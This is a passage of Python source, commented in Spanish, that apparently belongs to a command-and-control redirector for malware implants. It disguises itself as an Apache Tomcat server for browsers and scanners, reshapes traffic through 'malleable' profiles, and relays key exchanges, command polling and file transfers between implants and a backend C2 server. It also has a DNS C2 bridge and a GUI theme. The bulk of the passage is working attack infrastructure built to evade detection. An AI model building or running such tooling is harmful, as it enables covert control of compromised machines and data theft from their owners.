            self.send_header('Content-Type', 'application/octet-stream')
            self.send_header('Content-Length', '0')
            self._add_tomcat_headers()
            self.send_header('Connection', 'keep-alive')
            self.end_headers()
        except:
            pass
    
    def do_OPTIONS(self):
        """Maneja peticiones OPTIONS simulando Tomcat."""
        ip = self.client_address[0]
        path = urlparse(self.path).path
        
        logger.debug(f"OPTIONS {path} desde {ip}")
        
        try:
            self.send_response(200)
            self.send_header('Allow', 'GET, POST, HEAD, OPTIONS')
            self._add_tomcat_headers()
            self.send_header('Content-Length', '0')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()
        except:
            pass
    

    def log_message(self, format, *args):
        # Silenciar logs HTTP automáticos
        pass

    def do_POST(self):
        ip = self.client_address[0]
        path = urlparse(self.path).path
        

        # Verificación de rate limiting
        if not rate_limiter.is_allowed(ip):
            logger.warning(f"Rate limit excedido para {ip}")
            self.send_error(429, "Too Many Requests")
            return
        
        # Rutas C2 → solo log DEBUG; rutas desconocidas → INFO
        if self._is_c2_endpoint(path):
            logger.debug(f"POST {path} [{self._endpoint_task(path)}] desde {ip}")
        else:
            logger.info(f"POST {path} desde {ip}")
        
        # Verificar si no es endpoint C2 - simular Tomcat
        if not self._is_c2_endpoint(path):
            logger.debug(f"Endpoint no-C2: {path} Tomcat para {ip}")
            if self._handle_fake_tomcat_endpoint(path):
                return
            else:
                self._send_tomcat_404()
                return
        
        # Verificación ya hecha por _is_c2_endpoint (incluye perfil activo)
        # No re-verificar aquí para no romper URIs malleable del perfil
        
        allowed, reason = is_connection_allowed(ip, self.client_address[1], self.blocked_ips)
        if not allowed:
            logger.warning(f"HTTP rechazado {ip}: {reason}")
            self.send_error(403)
            return
        
        # === OBTENER SESSION-ID DEL HEADER ===
        session_id = self.headers.get('X-Session-ID', '')
        
        if not session_id:
            logger.warning(f"HTTP POST sin X-Session-ID de {ip}")
            self.send_error(400, "Missing X-Session-ID header")
            return
        
        # Obtener o crear sesión usando el UUID del cliente
        session = get_or_create_http_session(session_id, ip)
        
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length == 0:
                self._send_response(b'')
                return
            
            self.connection.settimeout(HTTP_BODY_TIMEOUT)
            
            payload = b''
            chunk_size = 8192
            while len(payload) < content_length:
                chunk = self.rfile.read(min(chunk_size, content_length - len(payload)))
                if not chunk:
                    break
                payload += chunk
                
                if not self._check_transfer_speed(len(chunk)):
                    self.send_error(408, "Request Timeout - Transfer too slow")
                    return
            
            self.connection.settimeout(None)
            
            logger.debug(f"[{session.session_id[:8]}] HTTP POST {path} de {ip}: {len(payload)} bytes")
            log_traffic('RX', 'HTTP', ip, bytes_to_hex(payload), f"POST {path}")
            
            task = self._endpoint_task(path)

            # === DESEMPAQUETAR payload según perfil activo ===
            _prof = get_active_profile() if _PROFILES_AVAILABLE else None
            if _prof and task not in ("handshake",):
                try: payload = _prof.unwrap_data_server(payload)
                except Exception: pass

            # === HANDSHAKE REQUEST_PUBKEY ===
            if task == "handshake" and payload == b"REQUEST_PUBKEY":
                self._handle_request_pubkey(ip, session)
                return

            # === HANDSHAKE AES KEY ===
            if task == "handshake" and len(payload) > 4:
                if not session.handshake_complete:
                    self._handle_ecdhe_payload(ip, session, payload)
                    return

            # === POLLING (long-poll de comandos) ===
            if task == "polling":
                self._handle_polling(ip, session, payload)
                return

            # === FILE TRANSFER / UPLOAD ===
            if task in ("upload", "file_transfer"):
                self._handle_file_upload(ip, session, payload)
                return

            # === FILE DOWNLOAD ===
            if task == "download":
                self._handle_file_download(ip, session, payload)
                return

            # === MENSAJE NORMAL (message + cualquier otro) ===
            self._handle_normal_message(ip, session, payload)
            
        except BrokenPipeError:
            logger.warning(f"Cliente HTTP {ip} cerró conexión")
        except Exception as e:
            logger.exception(f"Error en HTTP POST: {e}")
    
    def _handle_request_pubkey(self, ip, session):
        """FASE 1 del handshake ECDHE: solicitar pubkey al C2 y reenviarla al cliente."""
        logger.info(f"[{session.session_id[:8]}] REQUEST_PUBKEY desde {ip}")

        # ── Cerrar socket de handshake previo si existiera (retry del cliente) ──
        with session._hs_lock:
            if session._hs_sock:
                try: session._hs_sock.close()
                except: pass
                session._hs_sock = None

        # ── Crear conexión DIRECTA al C2 (sin pasar por get_or_create_backend_connection)
        # para evitar la lógica de reconexión que causa el bug en FASE 2.
        hs_sock = connection_pool.get_connection()
        if not hs_sock:
            logger.warning(f"[{session.session_id[:8]}] Sin backend disponible para {ip}")
            self.send_error(503)
            return

        try:
            hs_sock.settimeout(30.0)

            # Leer banner del C2 (siempre envía banner en nueva conexión)
            banner_data = self._recv_full_banner(hs_sock)
            if not banner_data:
                hs_sock.close()
                self.send_error(502)
                return
            logger.debug(f"[{session.session_id[:8]}] Banner C2: {banner_data[:60]!r}")

            # Enviar REQUEST_PUBKEY
            hs_sock.sendall(b"REQUEST_PUBKEY")

            # Leer ECDH_PUBKEY: (el PEM puede llegar en varios segmentos TCP)
            pubkey_data = b""
            while b"-----END PUBLIC KEY-----" not in pubkey_data:
                chunk = hs_sock.recv(4096)
                if not chunk:
                    raise ConnectionError("C2 cerró conexión durante FASE 1")
                pubkey_data += chunk

            if not pubkey_data.startswith(b"ECDH_PUBKEY:"):
                logger.error(f"[{session.session_id[:8]}] Respuesta inesperada C2: {pubkey_data[:60]!r}")
                hs_sock.close()
                self.send_error(502)
                return

            hs_sock.settimeout(None)

            # Guardar socket de handshake para FASE 2
            with session._hs_lock:
                session._hs_sock = hs_sock

            logger.info(f"[{session.session_id[:8]}] {startnc} ECDH_PUBKEY recibida ({len(pubkey_data)} bytes), esperando FASE 2")

            # Reenviar al cliente HTTP
            self._send_response(pubkey_data)
            log_traffic("TX", "HTTP", ip, bytes_to_hex(pubkey_data), "ECDH_PUBKEY")

        except Exception as e:
            logger.exception(f"[{session.session_id[:8]}] Error en FASE 1 handshake: {e}")
            try: hs_sock.close()
            except: pass
            with session._hs_lock:
                session._hs_sock = None
            self.send_error(500)

    def _recv_full_banner(self, sock, timeout=10.0, max_bytes=2048):
        """Lee el banner del C2 (espera datos con timeout corto)."""
        import select as _sel
        sock.settimeout(timeout)
        data = b""
        try:
            while True:
                ready, _, _ = _sel.select([sock], [], [], 1.0)
                if not ready:
                    break  # sin más datos
                chunk = sock.recv(max_bytes - len(data))
                if not chunk:
                    break
                data += chunk
                if len(data) >= max_bytes or b"\n" in chunk:
                    break
        except socket.timeout:
            pass
        return data
    
    def _handle_ecdhe_payload(self, ip, session, payload):
        """FASE 2 del handshake: reenvía pubkey+HMAC del cliente al C2 por el socket de FASE 1."""
        logger.info(f"[{session.session_id[:8]}] ECDHE payload desde {ip} ({len(payload)} bytes)")

        # Obtener el socket de handshake creado en FASE 1
        with session._hs_lock:
            hs_sock = session._hs_sock

        if not hs_sock:
            logger.warning(f"[{session.session_id[:8]}] Sin socket de handshake — cliente debe reintentar FASE 1")
            self.send_error(502)
            return

        try:
            # Enviar directamente al C2 por el socket de FASE 1 (sin reconexión)
            hs_sock.settimeout(15.0)
            hs_sock.sendall(payload)
            hs_sock.settimeout(None)

            logger.info(f"[{session.session_id[:8]}] {startnc} ECDHE payload enviado al C2 ({len(payload)} bytes)")

            # Mover el socket al backend de la sesión y limpiar _hs_sock
            with session._hs_lock:
                session._hs_sock = None

            with session.lock:
                # Si había un backend anterior, cerrarlo
                if session.backend_sock:
                    try: connection_pool.close_connection(session.backend_sock)
                    except: pass
                session.backend_sock = hs_sock
                session.encrypted_aes_key = payload

            session.mark_handshake_complete()
            logger.info(f"[{session.session_id[:8]}] {startnc} Handshake ECDHE completado para {ip}")

            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", "2")
            self.send_header("Connection", "keep-alive")
            self.end_headers()
            self.wfile.write(b"OK")

        except Exception as e:
            logger.exception(f"[{session.session_id[:8]}] Error en FASE 2 handshake: {e}")
            with session._hs_lock:
                if session._hs_sock:
                    try: session._hs_sock.close()
                    except: pass
                    session._hs_sock = None
            session.close()
            self.send_error(500)
    
    def _handle_polling(self, ip, session, payload):
        """Maneja el long-polling de comandos (espera hasta 30s) - CORREGIDO."""
        logger.debug(f"[{session.session_id[:8]}] Long-polling desde {ip}")
        
        if not session.handshake_complete:
            logger.warning(f"[{session.session_id[:8]}] Polling rechazado de {ip} - handshake no completado")
            self.send_error(400)
            return
        
        # Verificar cola de mensajes
        pending = session.get_pending_message()
        
        if pending:
            logger.debug(f"Mensaje pendiente para {ip}: {len(pending)} bytes")
            self._send_response(pending)
            log_traffic('TX', 'HTTP', ip, bytes_to_hex(pending), "Queued")
            return
        
        # Verificar backend
        backend_sock = session.get_or_create_backend_connection()
        
        if not backend_sock:
            self._send_empty_response()
            return
        
        # LONG-POLLING: esperar hasta 30s
        try:
            start_time = time.time()
            
            while (time.time() - start_time) < LONG_POLL_TIMEOUT:
                # Verificar si hay datos en el backend
                ready, _, _ = select.select([backend_sock], [], [], LONG_POLL_CHECK_INTERVAL)
                
                if ready:
                    backend_sock.settimeout(5.0)
                    len_bytes = self._recv_exact(backend_sock, 4)
                    
                    if not len_bytes:
                        self._send_empty_response()
                        return
                    
                    msg_len = struct.unpack('!I', len_bytes)[0]
                    
                    if msg_len == 0:
                        self._send_response(len_bytes)
                    else:
                        msg_data = self._recv_exact(backend_sock, msg_len)
                        
                        if not msg_data:
                            self.send_error(502)
                            return
                        
                        response_payload = len_bytes + msg_data
                        self._send_response(response_payload)
                        log_traffic('TX', 'HTTP', ip, bytes_to_hex(response_payload), "Data")
                    
                    backend_sock.settimeout(None)
                    return
                
                # Verificar si hay mensajes pendientes en la cola
                pending = session.get_pending_message()
                if pending:
                    logger.debug(f"Mensaje pendiente durante long-poll: {len(pending)} bytes")
                    self._send_response(pending)
                    log_traffic('TX', 'HTTP', ip, bytes_to_hex(pending), "Queued")
                    return
            
            # Timeout: enviar respuesta vacía
            self._send_empty_response()
            logger.debug(f"Long-poll timeout para {ip} después de {LONG_POLL_TIMEOUT}s")
                
        except socket.timeout:
            self._send_empty_response()
        except Exception as e:
            logger.error(f"Error en long-polling: {e}")
            self.send_error(502)
    
    def _handle_file_upload(self, ip, session, payload):
        """Maneja la subida de archivos (cliente -> servidor) - CORREGIDO."""
        logger.debug(f"[{session.session_id[:8]}] File upload desde {ip} - {len(payload)} bytes")
        
        if not session.handshake_complete:
            logger.warning(f"[{session.session_id[:8]}] Upload rechazado de {ip} - handshake no completado")
            self.send_error(400)
            return
        
        # Reenviar el chunk al backend
        if not session.safe_send_backend(payload):
            logger.error(f"Error reenviando upload de {ip}")
            self.send_error(502)
            return
        
        logger.debug(f"{startnc} Chunk de archivo reenviado desde {ip}: {len(payload)} bytes")
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Length', '2')
        self.send_header('Connection', 'keep-alive')
        self.end_headers()
        self.wfile.write(b'OK')
    
    def _handle_file_download(self, ip, session, payload):
        """Maneja la descarga de archivos (servidor -> cliente) - CORREGIDO."""
        logger.debug(f"[{session.session_id[:8]}] File download solicitado desde {ip}")
        
        if not session.handshake_complete:
            logger.warning(f"[{session.session_id[:8]}] Download rechazado de {ip} - handshake no completado")
            self.send_error(400)
            return
        
        # Verificar si hay chunks en cola
        pending = session.get_pending_message()
        
        if pending:
            self._send_response(pending)
            return
        
        # Esperar chunk del backend
        backend_sock = session.get_or_create_backend_connection()
        
        if not backend_sock:
            self._send_empty_response()
            return
        
        try:
            ready, _, _ = select.select([backend_sock], [], [], 5.0)
            
            if ready:
                backend_sock.settimeout(30.0)
                len_bytes = self._recv_exact(backend_sock, 4)
                
                if not len_bytes:
                    self._send_empty_response()
                    return
                
                msg_len = struct.unpack('!I', len_bytes)[0]
                
                if msg_len == 0:
                    self._send_empty_response()
                else:
                    msg_data = self._recv_exact(backend_sock, msg_len)
                    
                    if not msg_data:
                        self.send_error(502)
                        return
                    
                    response_payload = len_bytes + msg_data
                    self._send_response(response_payload)
                
                backend_sock.settimeout(None)
            else:
                self._send_empty_response()
                
        except socket.timeout:
            self._send_empty_response()
        except Exception as e:
            logger.error(f"Error en file download: {e}")
            self.send_error(502)
    
    def _handle_normal_message(self, ip, session, payload):
        """Maneja mensajes normales - CORREGIDO."""
        logger.debug(f"[{session.session_id[:8]}] Mensaje normal desde {ip} - {len(payload)} bytes")
        
        if not session.handshake_complete:
            logger.warning(f"[{session.session_id[:8]}] Mensaje rechazado de {ip} - handshake no completado")
            self.send_error(400)
            return
        
        backend_sock = session.get_or_create_backend_connection()
        
        if not backend_sock:
            logger.warning(f"[{session.session_id[:8]}] Sin backend disponible para {ip}")
            self.send_error(503)
            return
        
        if not session.safe_send_backend(payload):
            self.send_error(502)
            return
        
        logger.debug(f"[{session.session_id[:8]}] Mensaje reenviado al backend: {len(payload)} bytes")
        
        # Responder OK
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Length', '0')
        self.send_header('Connection', 'keep-alive')
        self.end_headers()
    
    def _send_response(self, data, ct: str = None):
        """Envía una respuesta HTTP con headers del perfil activo."""
        prof = get_active_profile() if _PROFILES_AVAILABLE else None
        if prof and prof.server_data_encoding() == 'json_field' and ct is None:
            data, ct = prof.wrap_data_server(data)
        content_type = ct or (prof.content_type_download() if prof else 'application/octet-stream')
        self.send_response(prof.status_ok() if prof else 200)
        self.send_header('Content-Type', content_type)
        self.send_header('Content-Length', str(len(data)))
        self.send_header('Connection', 'keep-alive')
        if prof:
            for hname, hval in prof.response_headers().items():
                try: self.send_header(hname, str(hval))
                except Exception: pass
        self.end_headers()
        self.wfile.write(data)
    
    def _send_empty_response(self):
        """Envía una respuesta vacía."""
        empty = struct.pack('!I', 0)
        self._send_response(empty)
    
    def _recv_exact(self, sock, n):
        """Recibe exactamente n bytes."""
        data = b''
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data
    
    def do_GET(self):
        """Maneja requests GET."""
        ip = self.client_address[0]
        path = urlparse(self.path).path

        if path == "/health":
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()
            self.wfile.write(b'{"status":"ok","version":"4.0"}')
            return

        if self._is_c2_endpoint(path) and self._endpoint_task(path) == "handshake":
            banner = b"HTTP/1.1\n"
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.send_header('Content-Length', str(len(banner)))
            self.send_header('Connection', 'keep-alive')
            self.end_headers()
            self.wfile.write(banner)
            return

        # Endpoint C2 legítimo — no es tráfico de navegador
        if self._is_c2_endpoint(path):
            logger.debug(f"GET C2 endpoint {path} desde {ip}")
            try:
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.send_header('Content-Length', '0')
                self._add_tomcat_headers()
                self.send_header('Connection', 'keep-alive')
                self.end_headers()
            except Exception:
                pass
            return

        # Cualquier otro GET (navegador, scanner, etc.) → página falsa Tomcat
        logger.debug(f"GET no-C2 {path} desde {ip} → camuflaje Tomcat")
        if self._handle_fake_tomcat_endpoint(path):
            return
        # Cualquier ruta desconocida → 404 estilo Tomcat
        self._send_tomcat_404()

# ============ FORWARD DATA TLS ============
def forward_data_tls(src, dst, src_label, dst_label, log_func, ip, stop_event):
    """Reenvía datos entre sockets TLS."""
    bytes_transferred = 0
    
    try:
        while not stop_event.is_set():
            ready = select.select([src], [], [], 1.0)
            
            if not ready[0]:
                continue
            
            try:
                data = src.recv(BUFFER_SIZE)
                if not data:
                    log_func(f"Cerrado: {src_label}")
                    break
                
                if "Cliente" in src_label or "TLS" in src_label:
                    log_traffic('RX', 'TLS', ip, bytes_to_hex(data), src_label)
                else:
                    log_traffic('TX', 'TLS', ip, bytes_to_hex(data), dst_label)
                
                total_sent = 0
                while total_sent < len(data) and not stop_event.is_set():
                    try:
                        chunk_sent = dst.send(data[total_sent:])
                        if chunk_sent == 0:
                            raise ConnectionError("Socket broken")
                        total_sent += chunk_sent
                    except socket.error as e:
                        if e.errno in (errno.EAGAIN, errno.EWOULDBLOCK):
                            time.sleep(0.001)
                            continue
                        else:
                            raise
                
                bytes_transferred += len(data)
                
                with state_lock:
                    if "Backend" in dst_label:
                        connection_stats[ip]['bytes_sent'] += len(data)
                    else:
                        connection_stats[ip]['bytes_recv'] += len(data)
                
            except socket.timeout:
                continue
            except socket.error as e:
                if e.errno in (errno.ECONNRESET, errno.EPIPE, errno.ENOTCONN, errno.EBADF):
                    log_func(f"Perdida: {src_label}")
                    break
                else:
                    log_func(f"Error: {src_label}: {e}")
                    break
            except Exception as e:
                log_func(f"Error: {src_label}: {e}")
                break
    
    except Exception as e:
        log_func(f"Error crítico: {src_label}: {e}")
    
    finally:
        stop_event.set()
        if bytes_transferred > 0:
            log_func(f"Completado {src_label}: {format_bytes(bytes_transferred)}")

# ============ HANDLE CLIENT TLS ============
def handle_client_tls(client_conn, client_addr, ssl_context, log_func, blocked_ips):
    """Maneja una conexión TLS."""
    ip, port = client_addr
    client_label = f"TLS({ip}:{port})"
    
    logger.info(f"Nueva conexión TLS desde {ip}:{port}")
    
    allowed, reason = is_connection_allowed(ip, port, blocked_ips)
    if not allowed:
        logger.warning(f"TLS rechazado {ip}: {reason}")
        log_func(f"TLS rechazado {ip}: {reason}")
        try:
            client_conn.close()
        except:
            pass
        return
    
    backend_conn = None
    tls_conn = None
    stop_event = threading.Event()
    
    try:
        register_connection(ip, client_conn)
        log_func(f"Nueva: {client_label}")
        
        try:
            tls_conn = ssl_context.wrap_socket(client_conn, server_side=True)
            apply_advanced_socket_options(tls_conn)
            logger.info(f"{startnc} TLS handshake exitoso con {ip}")
            log_func(f"TLS OK: {client_label}")
        except ssl.SSLError as e:
            logger.warning(f"Error TLS handshake con {ip}: {e}")
            log_func(f"TLS Error: {client_label}: {e}")
            return
        
        backend_conn = connection_pool.get_connection()
        if not backend_conn:
            logger.error(f"Sin backend disponible para {ip}")
            log_func(f"Backend Error: {client_label}")
            return
        
        logger.info(f"{startnc} Túnel establecido: {ip} <-> Backend")
        log_func(f"Túnel: {client_label} <-> Backend")
        
        t1 = threading.Thread(
            target=forward_data_tls,
            args=(tls_conn, backend_conn, f"Cliente TLS({ip})", f"Backend({ip})", log_func, ip, stop_event),
            daemon=True
        )
        t2 = threading.Thread(
            target=forward_data_tls,
            args=(backend_conn, tls_conn, f"Backend({ip})", f"Cliente TLS({ip})", log_func, ip, stop_event),
            daemon=True
        )
        
        t1.start()
        t2.start()
        
        while not stop_event.is_set():
            if not t1.is_alive() or not t2.is_alive():
                stop_event.set()
                break
            time.sleep(0.1)
        
        t1.join(timeout=2)
        t2.join(timeout=2)
    
    except Exception as e:
        logger.warning(f"Error en conexión TLS con {ip}: {e}")
        log_func(f"Error TLS: {client_label}: {e}")
    
    finally:
        logger.info(f"Cerrando conexión TLS con {ip}")
        if backend_conn:
            connection_pool.close_connection(backend_conn)
        if tls_conn:
            try:
                tls_conn.close()
            except:
                pass
        else:
            try:
                client_conn.close()
            except:
                pass
        
        unregister_connection(ip, client_conn)
        log_func(f"Cerrado: {client_label}")

# ============ START/STOP PROXY ============
def start_proxy_server(log_func, blocked_ips):
    """Inicia el servidor proxy."""
    global proxy_running, server_socket_tls, server_socket_http, connection_pool, session_cleanup_thread
    
    proxy_running = True
    
    connection_pool = BackendConnectionPool(
        proxy_config['target_host'],
        proxy_config['target_port'],
        apply_advanced_socket_options
    )
    connection_pool.start()
    
    mode = proxy_config['mode']
    
    log_func(f"Backend: {proxy_config['target_host']}:{proxy_config['target_port']}")
    log_func(f"Modo: {mode.upper()}")
    log_func(f"Endpoints: {len(proxy_config['endpoints'])}")
    
    # Iniciar TLS
    if mode in ('tls', 'both'):
        try:
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ssl_context.load_cert_chain(proxy_config['certfile'], proxy_config['keyfile'])
            
            server_socket_tls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket_tls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket_tls.bind((proxy_config['listen_host_tls'], proxy_config['listen_port_tls']))
            server_socket_tls.listen(50)
            
            log_func(f"TLS iniciado: {proxy_config['listen_host_tls']}:{proxy_config['listen_port_tls']}")
            
            def accept_tls():
                while proxy_running:
                    try:
                        server_socket_tls.settimeout(1.0)
                        client_conn, client_addr = server_socket_tls.accept()
                        threading.Thread(
                            target=handle_client_tls,
                            args=(client_conn, client_addr, ssl_context, log_func, blocked_ips),
                            daemon=True
                        ).start()
                    except socket.timeout:
                        continue
                    except Exception as e:
                        if proxy_running:
                            logger.error(f"Error aceptando TLS: {e}")
            
            threading.Thread(target=accept_tls, daemon=True).start()
            
        except Exception as e:
            log_func(f"Error iniciando TLS: {e}")
            logger.exception(f"Error TLS: {e}")
    
# Iniciar HTTP
    if mode in ('http', 'both'):
        try:
            HTTPWrappedHandler.blocked_ips = blocked_ips
            
            # === CREAR SERVIDOR HTTP O HTTPS ===
            use_https = proxy_config.get('use_https', False)
            
            if use_https:
                # Crear servidor HTTPS con SSL
                server_socket_http = ThreadedHTTPServer(
                    (proxy_config['listen_host_http'], proxy_config['listen_port_http']),
                    HTTPWrappedHandler
                )
                
                # Wrap el socket con SSL
                ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ssl_context.load_cert_chain(proxy_config['certfile'], proxy_config['keyfile'])
                server_socket_http.socket = ssl_context.wrap_socket(
                    server_socket_http.socket,
                    server_side=True
                )
                
                log_func(f"HTTPS iniciado: {proxy_config['listen_host_http']}:{proxy_config['listen_port_http']}")
                logger.info("Servidor HTTP configurado con SSL/TLS")
            else:
                # Crear servidor HTTP normal
                server_socket_http = ThreadedHTTPServer(
                    (proxy_config['listen_host_http'], proxy_config['listen_port_http']),
                    HTTPWrappedHandler
                )
                
                log_func(f"HTTP iniciado: {proxy_config['listen_host_http']}:{proxy_config['listen_port_http']}")
            
            server_socket_http.socket.settimeout(1.0)
            
            def serve_http():
                while proxy_running:
                    try:
                        server_socket_http.handle_request()
                    except Exception as e:
                        if proxy_running:
                            logger.debug(f"Error HTTP: {e}")
            
            threading.Thread(target=serve_http, daemon=True).start()
            
        except Exception as e:
            log_func(f"Error iniciando HTTP/HTTPS: {e}")
            logger.exception(f"Error HTTP/HTTPS: {e}")

    # ── DNS C2 Bridge ──────────────────────────────────────────────────────
    if proxy_config.get("dns_enabled", False):
        start_dns_bridge(log_func)

def stop_proxy_server():
    """Detiene el servidor proxy de forma ordenada."""
    global proxy_running, server_socket_tls, server_socket_http, connection_pool, session_cleanup_thread
    
    if not proxy_running:
        return
    
    logger.info(f"{alertnc} Iniciando detención del proxy...")
    proxy_running = False
    
    # 1. Cerrar sesiones HTTP
    logger.info("Cerrando sesiones HTTP...")
    with http_sessions_lock:
        session_count = len(http_sessions)
        for session_id, session in list(http_sessions.items()):
            try:
                logger.debug(f"Cerrando sesión [{session_id[:8]}] - IP: {session.ip}")
                session.close()
            except Exception as e:
                logger.debug(f"Error cerrando sesión [{session_id[:8]}]: {e}")
        http_sessions.clear()
    logger.info(f"{startnc} {session_count} sesiones HTTP cerradas")
    
    # 2. Cerrar socket TLS
    if server_socket_tls:
        logger.info("Cerrando servidor TLS...")
        try:
            server_socket_tls.close()
        except Exception as e:
            logger.debug(f"Error cerrando TLS: {e}")
        server_socket_tls = None
    
    # 3. Cerrar socket HTTP
    if server_socket_http:
        logger.info("Cerrando servidor HTTP...")
        try:
            server_socket_http.shutdown()
            server_socket_http.server_close()
        except Exception as e:
            logger.debug(f"Error cerrando HTTP: {e}")
        server_socket_http = None
    
    # 4. Detener pool de conexiones
    if connection_pool:
        logger.info("Deteniendo pool de conexiones...")
        try:
            connection_pool.stop()
        except Exception as e:
            logger.debug(f"Error deteniendo pool: {e}")
        connection_pool = None
    
    # 5. Cerrar conexiones activas
    logger.info("Cerrando conexiones activas...")
    with state_lock:
        active_count = sum(len(conns) for conns in active_connections.values())
        for ip, conns in list(active_connections.items()):
            for conn in conns:
                try:
                    conn.close()
                except:
                    pass
        active_connections.clear()
        logger.info(f"{startnc} {active_count} conexiones cerradas")
    
    # 6. Esperar thread de limpieza
    if session_cleanup_thread and session_cleanup_thread.is_alive():
        logger.info("Esperando thread de limpieza...")
        session_cleanup_thread.join(timeout=2)

    # 7. DNS Bridge
    if _dns_alive:
        stop_dns_bridge(logger.info)
    
    logger.info(f"{startnc} Proxy detenido completamente")

# ============ GUI ============

# ── VS CODIUM HIGH CONTRAST DARK THEME ──────────────────────────────────────
# Colores del tema "Default High Contrast" de VS Code/Codium
_TH = {
    "bg":       "#000000",
    "surface":  "#0a0a0a",
    "border":   "#6fc3df",
    "hover":    "#1a1a1a",
    "text":     "#ffffff",
    "text_dim": "#7f7f7f",
    "accent":   "#3794ff",
    "green":    "#89d185",
    "red":      "#f14c4c",
    "yellow":   "#cca700",
    "purple":   "#bc8cff",
    "orange":   "#d7ba7d",
    "cyan":     "#29b8db",
    "magenta":  "#e45454",
    "entry_bg": "#0a0a0a",
    "btn_bg":   "#0a0a0a",
    "btn_act":  "#3794ff",
    "select":   "#264f78",
    "select_fg":"#ffffff",
    "inactive": "#1e1e1e",
}


def _apply_dark_theme(root):
    """VS Codium High Contrast Dark theme para ttk y tk."""
    import tkinter.ttk as _ttk
    style = _ttk.Style(root)
    try:
        style.theme_use("clam")
    except Exception:
        pass

    BG      = _TH["bg"]
    SURF    = _TH["surface"]
    BORDER  = _TH["border"]
    HOVER   = _TH["hover"]
    TEXT    = _TH["text"]
    DIM     = _TH["text_dim"]
    ACCENT  = _TH["accent"]
    GREEN   = _TH["green"]
    RED     = _TH["red"]
    ENTRY   = _TH["entry_bg"]
    BTN     = _TH["btn_bg"]
    BTN_A   = _TH["btn_act"]
    SEL     = _TH["select"]
    SEL_FG  = _TH["select_fg"]
    INACTIVE= _TH["inactive"]

    root.configure(bg=BG)

    # Frames
    style.configure("TFrame",      background=BG)
    style.configure("Dark.TFrame", background=SURF)

    # Labels
    style.configure("TLabel",
        background=BG, foreground=TEXT, font=("Segoe UI", 9))
    style.configure("Dim.TLabel",
        background=BG, foreground=DIM, font=("Segoe UI", 8))
    style.configure("Header.TLabel",
        background=BG, foreground=TEXT, font=("Segoe UI", 10, "bold"))
    style.configure("Accent.TLabel",
        background=BG, foreground=ACCENT, font=("Segoe UI", 9))
    style.configure("Green.TLabel",  background=BG, foreground=GREEN)
    style.configure("Red.TLabel",    background=BG, foreground=RED)

    # LabelFrame — borde con contraste alto
    style.configure("TLabelframe",
        background=SURF, foreground=DIM,
        bordercolor=BORDER, relief="groove",
        borderwidth=1, font=("Segoe UI", 8, "bold"))
    style.configure("TLabelframe.Label",
        background=SURF, foreground=BORDER,
        font=("Segoe UI", 8, "bold"))

    # Buttons
    style.configure("TButton",
        background=BTN, foreground=TEXT,
        bordercolor=BORDER, darkcolor=BTN, lightcolor=BTN,
        relief="flat", padding=(8, 4), font=("Segoe UI", 9))
    style.map("TButton",
        background=[("active", HOVER), ("pressed", BTN_A), ("disabled", "#0f0f0f")],
        foreground=[("disabled", DIM)],
        bordercolor=[("active", BORDER), ("focus", ACCENT)])

    style.configure("Primary.TButton",
        background=ACCENT, foreground="#000000",
        bordercolor=ACCENT, font=("Segoe UI", 9, "bold"))
    style.map("Primary.TButton",
        background=[("active", BTN_A), ("pressed", "#1a5fbe")])

    style.configure("Danger.TButton",
        background="#1a0000", foreground=RED,
        bordercolor=RED, font=("Segoe UI", 9))
    style.map("Danger.TButton",
        background=[("active", "#2a0000"), ("pressed", "#3a0000")])

    style.configure("Warn.TButton",
        background="#1a1200", foreground=_TH["yellow"],
        bordercolor=_TH["yellow"], font=("Segoe UI", 9))
    style.map("Warn.TButton",
        background=[("active", "#2a1e00")])

    # Entry
    style.configure("TEntry",
        fieldbackground=ENTRY, foreground=TEXT,
        insertcolor=ACCENT, bordercolor=BORDER,
        lightcolor=ENTRY, darkcolor=ENTRY,
        selectbackground=SEL, selectforeground=SEL_FG,
        relief="flat", padding=(4, 3))
    style.map("TEntry",
        bordercolor=[("focus", ACCENT)],
        fieldbackground=[("readonly", SURF)])

    # Combobox
    style.configure("TCombobox",
        fieldbackground=ENTRY, background=BTN,
        foreground=TEXT, selectbackground=SEL, selectforeground=SEL_FG,
        bordercolor=BORDER, arrowcolor=DIM,
        insertcolor=ACCENT, relief="flat", padding=(4, 3))
    style.map("TCombobox",
        fieldbackground=[("readonly", SURF)],
        bordercolor=[("focus", ACCENT)],
        arrowcolor=[("active", ACCENT)])

    # Notebook — tabs con contraste alto
    style.configure("TNotebook",
        background=BG, bordercolor=BORDER, tabmargins=[0, 0, 0, 0])
    style.configure("TNotebook.Tab",
        background=INACTIVE, foreground=DIM,
        bordercolor=BORDER,
        padding=(14, 6), font=("Segoe UI", 9, "bold"))
    style.map("TNotebook.Tab",
        background=[("selected", BG), ("active", HOVER)],
        foreground=[("selected", TEXT), ("active", TEXT)],
        bordercolor=[("selected", BORDER)])

    # Scrollbar — delgada y sutil
    style.configure("TScrollbar",
        background=HOVER, troughcolor=BG,
        bordercolor=BG, arrowcolor=DIM,
        relief="flat", borderwidth=0)
    style.map("TScrollbar",
        background=[("active", BORDER)],
        arrowcolor=[("active", ACCENT)])

    # Treeview — filas con buen contraste
    style.configure("Treeview",
        background=SURF, foreground=TEXT,
        fieldbackground=SURF, bordercolor=BORDER,
        rowheight=22, font=("Consolas", 9))
    style.configure("Treeview.Heading",
        background=HOVER, foreground=BORDER,
        bordercolor=BORDER, relief="flat",
        font=("Segoe UI", 8, "bold"))
    style.map("Treeview",
        background=[("selected", SEL)],
        foreground=[("selected", SEL_FG)])
    style.map("Treeview.Heading",
        background=[("active", "#111111")])

    # Checkbutton / Radiobutton
